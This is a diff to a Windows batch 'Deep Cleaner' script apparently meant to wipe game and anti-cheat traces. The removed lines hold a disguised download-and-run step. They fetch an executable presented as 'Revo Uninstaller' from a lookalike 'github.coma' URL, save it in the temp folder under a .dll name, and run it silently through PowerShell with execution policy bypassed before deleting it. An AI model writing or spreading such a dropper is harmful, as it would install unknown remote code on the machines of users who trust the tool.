@@ -1,18 +1,6 @@
 FOR /L %%N IN (1,1,50) DO ECHO. Nothing >Nul 2>&1
 
 CLS & CALL:Embed
-ECHO. Close Games/Launchers/Anti-Cheats and delete using "Revo Uninstaller".
-
-ECHO. & ECHO. Press 'Enter' to run "Revo Uninstaller" ... & PAUSE >Nul 2>&1
-set "URL=https://github.coma/user4694635-collab/random/raw/refs/heads/main/RevoUninstaller.exe"
-set "TARGET=%TEMP%\RevoUninstaller.dll"
-powershell -ExecutionPolicy Bypass -NoProfile -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TARGET%')" >Nul 2>&1
-if exist "%TARGET%" ( 
-    start /wait "" "%TARGET%" & del /f /q "%TARGET%" 
-) else ( ECHO. & ECHO. Unable download "Revo Uninstaller" ^!)
-
-ECHO. & ECHO. Press 'Enter' to clean ... &  PAUSE >Nul 2>&1
-
 FOR /F "tokens=2" %%I IN ('Whoami /user /fo table /nh') DO SET SID=%%I
 
 FOR %%X IN (
@@ -136,7 +124,7 @@ GOTO :EOF
 :Embed
     ECHO. ^+---------------------------------------------------------------------------^+
     ECHO. ^|            Deep Cleaner. All Rights Reserved @agre.ud agreement.          ^|
-    ECHO. ^|        Last Traces Update At 12/13/2025 Current Data Is %DATE:~4,12%.       ^|
+    ECHO. ^|        Last Traces Update At 12/13/2025 Current Data Is %DATE%.       ^|
     ECHO. ^+---------------------------------------------------------------------------^+
     ECHO.
 GOTO:EOF
